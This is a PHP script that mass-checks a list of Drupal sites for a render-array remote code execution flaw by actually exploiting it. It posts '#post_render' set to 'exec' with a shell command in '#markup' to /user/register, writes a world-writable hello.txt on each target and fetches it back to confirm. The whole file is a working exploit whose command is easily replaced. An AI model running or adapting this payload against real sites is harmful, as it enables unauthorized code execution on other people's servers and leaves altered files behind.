<?php

require_once realpath(__DIR__ . "/../vendor/autoload.php");

use GuzzleHttp\Client;
use GuzzleHttp\Exception\ClientException;

if (empty($argv[1])) {
    exit("First argument should be the path for a json file.");
}

if (!file_exists(realpath($argv[1]))) {
    exit("File: $arg[1] doesn't");
}


$sites = json_decode(file_get_contents(realpath($argv[1])), true);

if (json_last_error() != JSON_ERROR_NONE) {
    exit(json_last_error_msg());
}

$client  = new Client(['allow_redirects' => true]);


foreach ($sites as $site) {
    try {
        $response = $client->post(
           $site . "/user/register",
           [
               'query' => [
                  'element_parents' => 'account/mail/%23value',
                  'ajax_form'=>1,
                  '_wrapper_format' => 'drupal_ajax', 
               ],
               'form_params' => [
                   'form_id' => 'user_register_form',
                   '_drupal_ajax' => 1,
                   'mail[#post_render][]' => 'exec',
                   'mail[#type]' => 'markup',
                   'mail[#markup]' => 'echo "I am in" | tee hello.txt && chmod 777 hello.txt'
               ]
           ]
       );

    } catch(ClientException $exception) {
        echo "($site) it is safe." . PHP_EOL;
        continue;
    }

    if ($response->getStatusCode() != 200) {
        echo "($site) it is safe." . PHP_EOL;
        continue;
    }
    
    echo "($site) it is at RISK." .PHP_EOL;

    try {
        $response = $client->get($site . '/hello.txt');
    } catch (ClientException $exception) {
        echo "--- It was able to execute code, but couldn't fetch the generated file." .PHP_EOL;
        continue;
    }

    if ($response->getStatusCode() == 200) {
       echo "--- It was able to execute code and fetch it, example $site/hello.txt." . PHP_EOL;
       continue; 
    }
    
}